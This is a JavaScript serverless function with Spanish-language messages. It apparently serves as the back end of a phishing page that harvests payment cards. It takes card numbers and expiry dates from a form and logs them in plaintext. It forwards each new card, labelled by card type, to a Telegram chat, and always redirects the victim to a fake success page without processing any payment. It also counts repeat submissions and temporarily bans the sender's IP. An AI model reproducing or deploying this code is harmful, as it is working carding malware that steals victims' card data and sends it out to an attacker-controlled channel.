const https = require('https');
const crypto = require('crypto');

const cardCache = new Map();
const bannedIPs = new Map();
const SPAM_WINDOW_MS = 30 * 60 * 1000;
const BAN_DURATION_MS = 5 * 60 * 1000;
const MAX_ATTEMPTS = 5;
const MAX_CACHE_SIZE = 100;

function cleanCache() {
    const now = Date.now();
    for (const [hash, data] of cardCache.entries()) {
        if (now - data.lastSeen > SPAM_WINDOW_MS) {
            cardCache.delete(hash);
        }
    }

    for (const [ip, banTime] of bannedIPs.entries()) {
        if (now - banTime > BAN_DURATION_MS) {
            bannedIPs.delete(ip);
        }
    }

    if (cardCache.size > MAX_CACHE_SIZE) {
        const entries = Array.from(cardCache.entries());
        entries.sort((a, b) => a[1].lastSeen - b[1].lastSeen);
        const toDelete = entries.slice(0, entries.length - MAX_CACHE_SIZE);
        toDelete.forEach(([hash]) => cardCache.delete(hash));
    }
}

function getCardHash(cardNumber) {
    const clean = cardNumber.replace(/\s/g, '');
    const hash = crypto.createHash('sha256').update(clean).digest('hex');
    return hash.substring(0, 16);
}

function checkSpam(cardNumber) {
    cleanCache();

    const hash = getCardHash(cardNumber);
    const now = Date.now();

    if (cardCache.has(hash)) {
        const data = cardCache.get(hash);
        const timeDiff = now - data.firstSeen;

        if (timeDiff < SPAM_WINDOW_MS) {
            data.count += 1;
            data.lastSeen = now;
            cardCache.set(hash, data);

            const isBanned = data.count >= MAX_ATTEMPTS;

            return {
                isSpam: true,
                count: data.count,
                timeDiffMinutes: Math.floor(timeDiff / 60000),
                isBanned: isBanned
            };
        } else {
            cardCache.set(hash, { count: 1, firstSeen: now, lastSeen: now });
            return { isSpam: false, isBanned: false };
        }
    } else {
        cardCache.set(hash, { count: 1, firstSeen: now, lastSeen: now });
        return { isSpam: false, isBanned: false };
    }
}

function isIPBanned(ip) {
    const banTime = bannedIPs.get(ip);
    if (!banTime) return false;

    const now = Date.now();
    if (now - banTime > BAN_DURATION_MS) {
        bannedIPs.delete(ip);
        return false;
    }
    return true;
}

function banIP(ip) {
    bannedIPs.set(ip, Date.now());
}

exports.handler = async (event) => {
    const headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'Content-Type',
        'Access-Control-Allow-Methods': 'POST, OPTIONS',
        'Location': '/success.html'
    };

    if (event.httpMethod === 'OPTIONS') {
        return { statusCode: 200, headers, body: '' };
    }

    try {
        let ip = event.headers['x-forwarded-for'];
        if (ip && ip.includes(',')) {
            ip = ip.split(',')[0].trim();
        }
        if (!ip) {
            ip = event.headers['client-ip'] || 'unknown';
        }

        if (isIPBanned(ip)) {
            console.log('IP banned:', ip);
            return {
                statusCode: 303,
                headers: {
                    ...headers,
                    'Location': '/success.html?banned=true'
                },
                body: ''
            };
        }

        const params = new URLSearchParams(event.body);
        const cardNumber = params.get('cc-number') || '';
        const expMonth = params.get('cc-exp-month') || '';
        const expYear = params.get('cc-exp-year') || '';

        console.log('Datos recibidos:', { cardNumber, expMonth, expYear });

        const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
            const cleanNum = cardNumber.replace(/\s/g, '');

            const spamCheck = checkSpam(cardNumber);

            let cardType = 'CARD';
            if (/^4/.test(cleanNum)) {
                cardType = 'VISA';
            } else if (/^5[1-5]/.test(cleanNum) || /^2(2[2-9]|[3-6]|7[0-1]|720)/.test(cleanNum)) {
                cardType = 'MASTERCARD';
            } else if (/^3[47]/.test(cleanNum)) {
                cardType = 'AMEX';
            }

            const fecha = new Date().toLocaleString('es-AR', {
                timeZone: 'America/Argentina/Buenos_Aires'
            });

            if (spamCheck.isSpam) {
                console.log('SPAM detectado:', spamCheck);

                if (spamCheck.isBanned) {
                    banIP(ip);
                    let banMessage = `🚫 IP BANEADA

🔁 TARJETA REPETIDA (${spamCheck.count}x)
⏱️ Enviada ${spamCheck.count} veces en ${spamCheck.timeDiffMinutes} minutos

${cardType}
Numero: ${cleanNum}
Vence: ${expMonth}/${expYear}
Fecha: ${fecha}

🚫 IP BANEADA POR 5 MINUTOS`;

                    try {
                        await sendToTelegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, banMessage);
                        console.log('Mensaje de ban enviado');
                    } catch (telegramError) {
                        console.error('Error enviando a Telegram:', telegramError);
                    }
                }

                const redirectUrl = spamCheck.isBanned
                    ? '/success.html?banned=true'
                    : '/success.html?spam=true';

                return {
                    statusCode: 303,
                    headers: {
                        ...headers,
                        'Location': redirectUrl
                    },
                    body: ''
                };
            } else {
                const message = `🔔 NUEVA TARJETA

${cardType}
Numero: ${cleanNum}
Vence: ${expMonth}/${expYear}
Fecha: ${fecha}`;

                console.log('Enviando tarjeta nueva...');
                try {
                    const result = await sendToTelegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, message);
                    console.log('Mensaje enviado:', result);
                } catch (telegramError) {
                    console.error('Error enviando a Telegram:', telegramError);
                }
            }
        } else {
            console.error('Faltan variables de entorno');
        }

        return {
            statusCode: 303,
            headers,
            body: ''
        };
    } catch (error) {
        console.error('Error:', error);
        return {
            statusCode: 303,
            headers,
            body: ''
        };
    }
};

function sendToTelegram(botToken, chatId, message) {
    return new Promise((resolve, reject) => {
        const data = JSON.stringify({
            chat_id: chatId,
            text: message
        });

        const options = {
            hostname: 'api.telegram.org',
            path: `/bot${botToken}/sendMessage`,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(data)
            }
        };

        const req = https.request(options, (res) => {
            let response = '';
            res.on('data', (chunk) => response += chunk);
            res.on('end', () => {
                console.log('Telegram response status:', res.statusCode);
                console.log('Telegram response:', response);
                if (res.statusCode === 200) {
                    resolve(response);
                } else {
                    reject(new Error(`Telegram error: ${response}`));
                }
            });
        });

        req.on('error', (error) => {
            console.error('Request error:', error);
            reject(error);
        });

        req.write(data);
        req.end();
    });
}
